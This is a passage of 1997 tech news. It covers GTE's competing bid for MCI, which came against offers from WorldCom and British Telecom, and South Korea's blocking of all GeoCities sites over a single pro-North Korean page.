Miss.-based WorldCom would give MCI shareholders $41.50 per share. 

The first suitor, British Telecom, needed only final shareholder approval for 
its $23 billion marriage to MCI when WorldCom made its higher bid. 

But now GTE is in the game. CEO Charles Lee offered MCI Chairman Bert Roberts 
the chairmanship of the merged company, which would be headquartered in 
Washington, D.C., where MCI is located. 

Lee said his company would also consider a cash and stock deal rather than an 
all-cash acquisition. 

In a letter to Roberts, Lee said a merger would create a company with more 
than $40 billion in annual revenue, more than 21 million local and 24 million 
long-distance lines, and 5 million wireless customers. 

In addition, Lee continued, it would result in more efficient operations and 
new revenue opportunities. "No two companies in the industry today are more 
complemenetary or better situated to expand the availability and breadth of 
bundled service offerings to local, national and international customers," 
the letter read. 

GTE also said it is willing to negotiate a continued relationship with 
British Telecom if its offer is accepted. 

MCI said its board "will meet shortly to review all issues and options with 
respect to the GTE proposal and the unsolicited proposal received from 
WorldCom, in the context of the company's strategic merger agreement with 
BT." 

But the BT deal isn't likely to happen, analysts said. 

"MCI is in play now," said Steve Shook, an analyst with Interstate/Johnson 
Lane in Charlotte, N.C. "This is just one more nail in the coffin for BT." 

British Telecom had planned to pay about $23 billion, a price that was 
reduced after MCI revealed last summer that it would incur hundreds of 
millions of dollars in losses trying to enter the local phone market this 
year. 

The prospect of another uninvited guest at the MCI bidding party sent shares 
of MCI, British Telecom, WorldCom, and GTE in opposite directions Wednesday. 

Trading of MCI and GTE shares was suspended around 1:00 p.m., but MCI [MCIC] 
shares resumed trading an hour later and closed up 1 9/16 to 36 7/8. GTE 
[GTE] was up 2 3/16 at 48 before the suspension of trading. 

Shares of British Telecom [BTY], which owns a 20 percent stake in MCI, 
climbed 2 11/16 to 75, while WorldCom [WCOM] fell 1 5/16 to 35 7/16. 

MCI's board had been considering WorldCom's offer but had not yet made a 
decision about whether to abandon the BT deal. Shareholder approval is still 
needed for any merger, whether it is with BT, WorldCom, or GTE. 

Shook said the WorldCom offer remains the best of the bunch. 

Although GTE's offer is all cash, "it's not like you're getting a junky stock 
with WorldCom," he said. "You're getting really good currency. WorldCom has 
always delivered on what they said." 

But if the prospect of a merged WorldCom-MCI was more appetizing to analysts 
than the BT deal, the advantages over GTE's proposal are not so clear. 

BT has no presence in the U.S. local phone market, which MCI has been trying, 
with little success, to penetrate. WorldCom has a limited local business, 
while GTE already provides local service in 29 states. 

GTE is also a contender in the race to provide one-stop shopping for 
communications services, including local and long-distance calling as well as 
data services such as Internet access. Last May, GTE bought Internet access 
provider BBN, and it has a strategic alliance with Cisco to develop enhanced 
data and Internet services. 

Earlier Wednesday, GTE reported third quarter profits of $756 million, or 79 
cents a share, beating Wall Street estimates of 77 cents per share, as 
reported by First Call.

During the quarter, consolidated revenue was up 11 percent to $5.94 billion, 
compared to $5.34 billion in the third quarter last year. The 11 percent jump 
includes $127 million from GTE's acquisition of BBN.

Excluding the $127 million of new revenue related to BBN, sales grew 8.8 
percent.

"These results illustrate our success in positioning GTE for the future," 
said GTE CEO Charles Lee. "The BBN acquisition, completed during the quarter, 
represents the cornerstone of GTE's strategy to become a dominant player in 
the data market."

 GeoCities Sites Blocked In South Korea 
 10/22/97
 By John Borland, Net Insider           
 
 In the second such instance of international censorship leveled at the 
 company this year, all sites on the sprawling GeoCites network of Websites 
 have been blocked in South Korea. 

Company officials confirmed Wednesday that the South Korean government asked 
the agency that handles network traffic in that country to block access to 
all GeoCities sites by South Korean citizens. The request came in reaction to 
a single  pro-North Korean site on the GeoCities network. 

"Unfortunately they are blocking access to over a million sites," said 
GeoCities spokesman Bennett Kleinberg, of Edelman Public Relations Worldwide. 
"GeoCities has issued a letter to the Consulate General  asking that they 
look into the situation." 

The company first learned of the blockage on Oct. 12, through an E-mail from 
a user, Kleinberg said. After examining the offending page, the company 
determined that it did not violate the contract that all GeoCities 
"homesteaders" must sign, and decided to let it remain online. 

The page, sponsored by a group calling itself the Australian Association for 
the Study of the Juche Idea, praises North Korean philosophy and leadership. 
Juche, it says, is an concept developed by late North Korean President Kim Il 
Sung focusing on self-reliance and national independence. 

Korean officials at the country's San Francisco Consulate said they did not 
have enough knowledge of the situation to comment. 

The action is the second time this year that GeoCities sites have been 
unavailable to an entire country of users. In June, the Malaysian government 
asked the country's single Internet service provider to block access to 
GeoCities, again because of a single site that was critical of the 
government. In that case, however, GeoCities determined that the site's calls 
for "insurrection and revolution" had violated the service's terms of 
agreement, and quickly took it offline. 

"We reserve the right to pull any site at any time" that has violated the 
service's contract, Kleinberg said. "But at this point the determination has 
been made that [the pro-North Korean site] hasn't done that." 

The action was not unexpected coming from the current South Korean 
leadership, said Stanton McCandlish, program director at the Electronic 
Freedom Foundation. The government has repeatedly shut down South Korean 
Websites disseminating pro-North Korean information, he said.

"They [South Korean Leadership] are used to being able to unilaterally ban 
things," McCandlish said. "The Internet is not a medium that can be 
effectively censored. It's a hard lesson for them to learn." 

As of Wednesday, GeoCities had not heard back from the Korean government, 
Kleinberg said, but hoped to resolve the situation though normal trade and 
diplomatic channels.
